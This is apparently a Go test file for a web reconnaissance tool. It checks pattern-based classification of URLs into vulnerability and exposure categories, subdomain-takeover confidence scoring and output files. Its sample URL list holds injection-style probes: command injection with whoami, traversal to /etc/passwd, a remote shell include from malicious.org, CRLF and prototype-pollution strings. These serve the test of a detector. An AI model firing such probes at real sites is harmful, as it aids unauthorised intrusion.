package tests

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/frozeniceee/Reconpipeline/internal/config"
	"github.com/frozeniceee/Reconpipeline/internal/intelligence/dns"
	"github.com/frozeniceee/Reconpipeline/internal/tools/gf"
	"github.com/frozeniceee/Reconpipeline/internal/tools/httpx"
	"github.com/frozeniceee/Reconpipeline/internal/workspace"
)

func createTestGF(t *testing.T) *gf.Tool {
	t.Helper()
	dir := t.TempDir()
	cfg := &config.Config{
		WorkDir:     dir,
		ToolsDir:    filepath.Join(dir, "tools"),
		VersionsDir: filepath.Join(dir, "versions"),
		CacheDir:    filepath.Join(dir, "cache"),
		ConfigDir:   filepath.Join(dir, "config"),
		LogsDir:     filepath.Join(dir, "logs"),
		ResultsDir:  filepath.Join(dir, "results"),
	}
	ws := workspace.NewManager(cfg)
	return gf.New(ws)
}

func TestPatternIntelligence_AllCategories(t *testing.T) {
	tempDir := t.TempDir()
	g := createTestGF(t)

	sampleURLs := []string{
		// 1. Classic Vulnerabilities
		"https://example.com/search?q=test&xss_param=alert(1)",
		"https://example.com/items?id=105&sort=desc",
		"https://example.com/view?file=report.pdf",
		"https://example.com/proxy?url=http://internal.service",
		"https://example.com/out?redirect_url=https://attacker.com",

		// 1b. Extended Vulnerabilities
		"https://example.com/include?page=http://malicious.org/shell.txt",
		"https://example.com/render?template=user.html",
		"https://example.com/parse?xml_data=<foo>bar</foo>",
		"https://example.com/tools?cmd=whoami",
		"https://example.com/files/../../../../etc/passwd",
		"https://example.com/page?next=%0d%0aSet-Cookie:crlf=true",
		"https://example.com/api?__proto__[polluted]=true",
		"https://example.com/restore?serialized=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",

		// 2. API Intelligence
		"https://example.com/api/v1/users",
		"https://example.com/graphql?query={me{id}}",
		"https://example.com/swagger-ui/index.html",
		"wss://example.com/socket.io/?EIO=4&transport=websocket",

		// 3. Authentication Intelligence
		"https://example.com/auth/login",
		"https://example.com/forgot-password?email=test@example.com",
		"https://example.com/verify-mfa?code=123456",
		"https://example.com/oauth/callback?code=abc",
		"https://example.com/signup",

		// 4. Authorization Candidate
		"https://example.com/users/99824?account_id=55102",

		// 5. Administrative Intelligence
		"https://example.com/admin/dashboard",

		// 6. Debug & Development Intelligence
		"https://example.com/debug/vars",
		"https://example.com/actuator/health",

		// 7. Sensitive File Intelligence
		"https://example.com/.env",
		"https://example.com/.git/config",
		"https://example.com/backup.sql",
		"https://example.com/logs/error.log",
		"https://example.com/config.json",

		// 8. Backup & Legacy Intelligence
		"https://example.com/backup.zip",
		"https://example.com/legacy/old_v1",

		// 9. Secret & Credential Indicator
		"https://example.com/api?access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
		"https://example.com/connect?api_key=sk_live_1234567890abcdef",

		// 10. Cloud Infrastructure Intelligence
		"https://example.com/assets?s3_url=https://s3.amazonaws.com/my-bucket/doc.pdf",
		"https://example.com/cloud?azure=test.blob.core.windows.net",
		"https://example.com/storage?gcp=storage.googleapis.com/assets",
		"https://example.com/static?cdn=d123456abcdef8.cloudfront.net",

		// 11. File Operations Intelligence
		"https://example.com/file-upload/handler",
		"https://example.com/download.php?id=45",
	}

	urlsFile := filepath.Join(tempDir, "urls.txt")
	_ = os.WriteFile(urlsFile, []byte(strings.Join(sampleURLs, "\n")), 0640)

	actx := &gf.AnalysisContext{
		TargetDomain:     "example.com",
		VerifiedURLsFile: urlsFile,
	}

	outDir := filepath.Join(tempDir, "gf-out")
	summary, counts, err := g.RunIntelligence(context.Background(), actx, urlsFile, outDir)
	if err != nil {
		t.Fatalf("RunIntelligence failed: %v", err)
	}

	// Verify all 5 classic patterns matched
	for _, classic := range []string{"xss", "sqli", "lfi", "ssrf", "redirect"} {
		if counts[classic] == 0 {
			t.Errorf("Expected classic pattern %s to match at least 1 URL, got 0", classic)
		}
	}

	// Verify extended candidate matches
	expectedExtended := []string{
		"rfi", "ssti", "xxe", "cmdi", "traversal", "crlf", "proto-pollution", "deserialization",
		"api-rest", "api-graphql", "api-swagger", "api-websocket",
		"auth-login", "auth-reset", "auth-mfa", "auth-oauth", "auth-register",
		"idor-candidate", "admin", "debug", "actuator",
		"sensitive-env", "sensitive-git", "sensitive-sql", "sensitive-log", "sensitive-config",
		"backup", "legacy", "secret-token", "secret-key",
		"cloud-s3", "cloud-azure", "cloud-gcp", "cloud-cloudfront",
		"file-upload", "file-download",
	}

	for _, pat := range expectedExtended {
		if counts[pat] == 0 {
			t.Errorf("Expected pattern %s to match at least 1 URL, got 0", pat)
		}
	}

	// Verify Category Summaries
	if len(summary.Categories) < 10 {
		t.Errorf("Expected at least 10 categories summarized, got %d", len(summary.Categories))
	}
}

func TestPatternIntelligence_FalsePositiveSuppression(t *testing.T) {
	tempDir := t.TempDir()
	g := createTestGF(t)

	// URLs that have query parameters but point to static assets (css, png, woff2)
	// These should be suppressed from parameter vulnerability fuzzing candidates
	noiseURLs := []string{
		"https://example.com/assets/styles.css?id=123&theme=dark",
		"https://example.com/static/logo.png?v=456&size=large",
		"https://example.com/fonts/inter.woff2?load=bold",
		// Pure tracking parameter noise without other params
		"https://example.com/blog/article?utm_source=google&utm_medium=cpc&utm_campaign=winter",
	}

	urlsFile := filepath.Join(tempDir, "noise.txt")
	_ = os.WriteFile(urlsFile, []byte(strings.Join(noiseURLs, "\n")), 0640)

	actx := &gf.AnalysisContext{
		TargetDomain:     "example.com",
		VerifiedURLsFile: urlsFile,
	}

	outDir := filepath.Join(tempDir, "gf-noise-out")
	_, counts, err := g.RunIntelligence(context.Background(), actx, urlsFile, outDir)
	if err != nil {
		t.Fatalf("RunIntelligence failed: %v", err)
	}

	// Static assets with ?id= should not be flagged as SQLi or LFI
	if counts["sqli"] > 0 {
		t.Errorf("Expected 0 SQLi matches for static asset noise, got %d", counts["sqli"])
	}
	if counts["lfi"] > 0 {
		t.Errorf("Expected 0 LFI matches for static asset noise, got %d", counts["lfi"])
	}
}

func TestSubdomainTakeoverEngine_DetectionAndConfidence(t *testing.T) {
	// 1. High Confidence test: AWS S3 CNAME with NoSuchBucket signature
	s3Cand, ok := gf.EvaluateTakeover("bucket.example.com", "my-bucket.s3.amazonaws.com", 404, "404 Not Found", "AmazonS3", "NoSuchBucket The specified bucket does not exist")
	if !ok {
		t.Fatalf("Expected takeover detection for S3 bucket")
	}
	if s3Cand.Confidence != gf.ConfidenceHigh {
		t.Errorf("Expected HIGH confidence for S3 with NoSuchBucket, got %s", s3Cand.Confidence)
	}
	if s3Cand.Service != "AWS S3 Bucket" {
		t.Errorf("Expected service AWS S3 Bucket, got %s", s3Cand.Service)
	}

	// 2. High Confidence test: GitHub Pages CNAME with exact fingerprint
	ghCand, ok := gf.EvaluateTakeover("docs.example.com", "user.github.io", 404, "404 Not Found", "GitHub.com", "There isn't a GitHub Pages site here")
	if !ok {
		t.Fatalf("Expected takeover detection for GitHub Pages")
	}
	if ghCand.Confidence != gf.ConfidenceHigh {
		t.Errorf("Expected HIGH confidence for GitHub Pages with signature, got %s", ghCand.Confidence)
	}

	// 3. Medium Confidence test: Heroku CNAME with 404 but without exact fingerprint
	hkCand, ok := gf.EvaluateTakeover("api.example.com", "myapp.herokuapp.com", 404, "404 Not Found", "Cowboy", "Generic 404")
	if !ok {
		t.Fatalf("Expected takeover detection for Heroku")
	}
	if hkCand.Confidence != gf.ConfidenceMedium {
		t.Errorf("Expected MEDIUM confidence for Heroku with 404 without body fingerprint, got %s", hkCand.Confidence)
	}

	// 4. Low Confidence test: CNAME points to Shopify, but status is 200 without error
	shopCand, ok := gf.EvaluateTakeover("shop.example.com", "shop.myshopify.com", 200, "Active Store", "cloudflare", "Welcome to the store")
	if !ok {
		t.Fatalf("Expected takeover detection for Shopify")
	}
	if shopCand.Confidence != gf.ConfidenceLow {
		t.Errorf("Expected LOW confidence for live 200 shopify CNAME, got %s", shopCand.Confidence)
	}

	// 5. Negative test: Arbitrary internal CNAME
	_, nonMatch := gf.EvaluateTakeover("internal.example.com", "lb.corp.internal", 404, "", "", "")
	if nonMatch {
		t.Errorf("Expected no takeover match for non-service CNAME")
	}
}

func TestPatternIntelligence_HTTPX2Enrichment(t *testing.T) {
	tempDir := t.TempDir()
	g := createTestGF(t)

	// Create verified URLs file
	urlRedirect := "https://example.com/go?redirect=https://other.com"
	urlAPI := "https://example.com/api/v1/orders"
	urlSecret := "https://example.com/callback?access_token=secret1234567890abcdef"
	urlSensitive := "https://example.com/.env"

	urlsFile := filepath.Join(tempDir, "verified-urls.txt")
	_ = os.WriteFile(urlsFile, []byte(strings.Join([]string{urlRedirect, urlAPI, urlSecret, urlSensitive}, "\n")), 0640)

	// Create mock HTTPX #2 metadata.json
	metas := []httpx.URLMeta{
		{
			URL:           urlRedirect,
			StatusCode:    302,
			Location:      "https://other.com",
			ContentLength: 0,
		},
		{
			URL:         urlAPI,
			StatusCode:  200,
			ContentType: "application/json; charset=utf-8",
		},
		{
			URL:        urlSensitive,
			StatusCode: 200,
		},
	}
	metaData, _ := json.Marshal(metas)
	metaFile := filepath.Join(tempDir, "metadata.json")
	_ = os.WriteFile(metaFile, metaData, 0640)

	actx := &gf.AnalysisContext{
		TargetDomain:     "example.com",
		VerifiedURLsFile: urlsFile,
		HTTPX2MetaFile:   metaFile,
	}

	outDir := filepath.Join(tempDir, "enriched-out")
	summary, _, err := g.RunIntelligence(context.Background(), actx, urlsFile, outDir)
	if err != nil {
		t.Fatalf("RunIntelligence failed: %v", err)
	}

	// Verify High confidence counts boosted by HTTP status and Location header
	if summary.ConfidenceCounts[gf.ConfidenceHigh] == 0 {
		t.Errorf("Expected High confidence counts to be boosted by HTTPX metadata, got 0")
	}

	// Read pattern-results.json to inspect matches
	resultsFile := filepath.Join(outDir, "patterns", "pattern-results.json")
	resultsBytes, err := os.ReadFile(resultsFile)
	if err != nil {
		t.Fatalf("Failed to read pattern-results.json: %v", err)
	}

	var matches []gf.CandidateMatch
	if err := json.Unmarshal(resultsBytes, &matches); err != nil {
		t.Fatalf("Failed to parse pattern-results.json: %v", err)
	}

	foundRedirectHigh := false
	foundAPIHigh := false
	foundEnvHigh := false

	for _, m := range matches {
		if m.Pattern == "redirect" && m.Confidence == gf.ConfidenceHigh && m.StatusCode == 302 {
			foundRedirectHigh = true
		}
		if m.Pattern == "api-rest" && m.Confidence == gf.ConfidenceHigh && strings.Contains(m.ContentType, "json") {
			foundAPIHigh = true
		}
		if m.Pattern == "sensitive-env" && m.Confidence == gf.ConfidenceHigh && m.StatusCode == 200 {
			foundEnvHigh = true
		}
	}

	if !foundRedirectHigh {
		t.Errorf("Expected redirect with HTTP 302 to be HIGH confidence")
	}
	if !foundAPIHigh {
		t.Errorf("Expected API endpoint with application/json to be HIGH confidence")
	}
	if !foundEnvHigh {
		t.Errorf("Expected .env with HTTP 200 to be HIGH confidence")
	}
}

func TestPatternIntelligence_StructuredOutputs(t *testing.T) {
	tempDir := t.TempDir()
	g := createTestGF(t)

	// Create test URLs
	testURLs := []string{
		"https://example.com/login",
		"https://example.com/admin",
		"https://example.com/test?url=https://internal",
	}
	urlsFile := filepath.Join(tempDir, "urls.txt")
	_ = os.WriteFile(urlsFile, []byte(strings.Join(testURLs, "\n")), 0640)

	// Create test DNS records with takeover candidate
	dnsRecords := []dns.Record{
		{
			Hostname: "sub.example.com",
			CNAME:    "unclaimed.herokuapp.com",
		},
	}
	dnsBytes, _ := json.Marshal(dnsRecords)
	dnsFile := filepath.Join(tempDir, "dns-records.json")
	_ = os.WriteFile(dnsFile, dnsBytes, 0640)

	// Host metadata for the subdomain
	hostMetas := []httpx.HostMeta{
		{
			URL:        "https://sub.example.com",
			StatusCode: 404,
			Title:      "Heroku | No such app",
		},
	}
	hostBytes, _ := json.Marshal(hostMetas)
	hostMetaFile := filepath.Join(tempDir, "host-meta.json")
	_ = os.WriteFile(hostMetaFile, hostBytes, 0640)

	actx := &gf.AnalysisContext{
		TargetDomain:     "example.com",
		VerifiedURLsFile: urlsFile,
		DNSRecordsFile:   dnsFile,
		HTTPX1MetaFile:   hostMetaFile,
	}

	outDir := filepath.Join(tempDir, "outputs-test")
	summary, _, err := g.RunIntelligence(context.Background(), actx, urlsFile, outDir)
	if err != nil {
		t.Fatalf("RunIntelligence failed: %v", err)
	}

	// 1. Verify pattern-summary.json exists and has correct schema
	summaryPath := filepath.Join(outDir, "patterns", "pattern-summary.json")
	if _, err := os.Stat(summaryPath); os.IsNotExist(err) {
		t.Errorf("Expected pattern-summary.json to exist")
	}

	// 2. Verify pattern-results.json exists
	resultsPath := filepath.Join(outDir, "patterns", "pattern-results.json")
	if _, err := os.Stat(resultsPath); os.IsNotExist(err) {
		t.Errorf("Expected pattern-results.json to exist")
	}

	// 3. Verify takeover-candidates.json and .txt exist
	takeoverJSON := filepath.Join(outDir, "patterns", "takeover-candidates.json")
	takeoverTXT := filepath.Join(outDir, "takeover-candidates.txt")
	if _, err := os.Stat(takeoverJSON); os.IsNotExist(err) {
		t.Errorf("Expected takeover-candidates.json to exist")
	}
	if _, err := os.Stat(takeoverTXT); os.IsNotExist(err) {
		t.Errorf("Expected takeover-candidates.txt to exist")
	}

	// 4. Verify other-patterns.txt exists
	otherTXT := filepath.Join(outDir, "other-patterns.txt")
	if _, err := os.Stat(otherTXT); os.IsNotExist(err) {
		t.Errorf("Expected other-patterns.txt to exist")
	}

	// 5. Verify disclaimer is present
	if !strings.Contains(summary.Disclaimer, "not confirmed vulnerabilities") {
		t.Errorf("Disclaimer missing required security boundary wording")
	}

	// 6. Verify takeover candidate was captured in summary
	if summary.TakeoverCount == 0 {
		t.Errorf("Expected at least 1 takeover candidate in summary")
	}
}
